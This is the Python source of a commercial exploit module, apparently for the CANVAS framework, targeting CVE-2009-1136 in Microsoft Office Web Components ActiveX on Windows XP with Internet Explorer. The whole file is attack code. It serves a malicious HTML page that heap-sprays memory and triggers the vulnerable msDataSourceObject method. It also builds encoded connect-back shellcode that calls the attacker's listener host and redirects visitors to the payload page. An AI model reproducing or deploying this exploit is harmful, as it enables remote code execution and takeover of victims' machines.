#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2009
#


import sys

if '.' not in sys.path: 
	sys.path.append('.')

from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside

import struct

# GUI info
NAME = "Microsoft Office Web Components ActiveX msDataSourceObject Code Execution Vulnerability"

DESCRIPTION = "Code Execution Vulnerability in Microsoft Office Web Components ActiveX"

DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "Microsoft"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["Date public"] = "2009.07.13"
DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/35642"
DOCUMENTATION["Versions Affected"] = "Microsoft Office XP/2003"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2009-1136"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1136"
DOCUMENTATION["Notes"] = ""

VERSION = '1.0'

GTK2_DIALOG = 'dialog.glade2'

PROPERTY = {}
PROPERTY['TYPE'] = 'Exploit'
PROPERTY['SITE'] = 'Clientside'
PROPERTY['ARCH'] = [['Windows']]
PROPERTY['VERSION'] = ['XP']

NOTES = """
"""

CHANGELOG = """
"""

targets = {    
    0:['Windows XP with IE'],
}

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.clientversion = 1
        self.badstring = "\x00"
        self.subesp = 0
        self.name = NAME 
        self.filename = "index.html"
        return
        
    def makefile(self):
        filedata = """
<HTML> 
<BODY>
 
<DIV id="targetDiv">

</DIV>

<SCRIPT language="javascript">  

try {		
	var target = new ActiveXObject("OWC10.Spreadsheet");
	
	if (target) {				
			
		var stackBuffer = "";
		var heapSprayToAddress = 0x0c0c0c0c; 
		var payLoadCode = unescape('SHELLCODE'); 
		var heapBlockSize = 0x400000; 
		var payLoadSize = payLoadCode.length * 2; 
		var spraySlideSize = heapBlockSize - (payLoadSize+0x38); 
		var spraySlide = unescape("%u0c0c%u0c0c"); 
		spraySlide = getSpraySlide(spraySlide,spraySlideSize); 
		heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize; 
		memory = new Array(); 
		
		for (i=0;i<heapBlocks;i++) { 
			memory[i] = spraySlide + payLoadCode; 
		} 
		
		function getSpraySlide(spraySlide, spraySlideSize) {
			while (spraySlide.length*2<spraySlideSize) { 
				spraySlide += spraySlide; 
			} 
			
			spraySlide = spraySlide.substring(0,spraySlideSize/2); 
			return spraySlide; 
		} 
		
    e = new Array(); 
    e.push(1); 
    e.push(1); 
    e.push(1); 
    e.push(window); 

    for(i = 0 ; i < e.length ; i++){ 
      for(j = 0 ; j < 10 ; j++){ 
        try{ 
          target.Evaluate(e[i]); 
        } 
        catch(e) {} 
      } 
    } 

    window.status = e[3] + '';
     
    for(j = 0 ; j < 10 ; j++){ 
      try{ 
        target.msDataSourceObject(e[3]); 
      } 
      catch(e) {} 
    } 

	}
}
catch(e) {}

</SCRIPT> 

</BODY> 
</HTML>        
""".replace('SHELLCODE', urluencode('AAAAAA' + self.shellcode))        
        return filedata

    def makesploit(self, clientheader, clientbody):        
        from libs.spkproxy import header, body
        h = header('SERVER')
        b = body()
        
        if clientheader.URL.count(self.filename):
            self.createShellcode()
            sploitstring = self.makefile()            
            b.setBody(sploitstring)
        else:
            self.log('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'binary/octet-stream')
        return h, b

    def neededListenerTypes(self):
        from canvasengine import HTTPMOSDEF
        return [HTTPMOSDEF]
    
    def createShellcode(self):
        host = self.callback.ip
        port = self.callback.port
        
        self.log('Connect back information: %s:%d' % (host,port))
        proxy_payload = ''
        try:
            # this stuff is only used when served in HTTP MOSDEF mode
            if hasattr(self, 'HTTPMOSDEF') and self.HTTPMOSDEF == True:
                # make sure that fromcreatethread is set to 0 in your
                # httpserver/exploit listenerArgsDict!
                import shellcode.standalone.windows.payloads as payloads
                ssl_dict = { True : 'https', False : 'http' }
                p   = payloads.payloads()
                sc  = p.http_proxy("%s://%s" % \
                                    (ssl_dict[self.useSSL],\
                                    self.callback.ip),\
                                    self.callback.port)
                proxy_payload = p.assemble(sc)
        except:
            proxy_payload = ''
            
        rawshellcode = self.createInjectToSelf(host, port,\
                                               injectme=proxy_payload,\
                                               movetostack=True)
        from encoder import chunkedaddencoder
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.shellcode=encoder.encode(rawshellcode)
        return self.shellcode

    def run(self):        
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
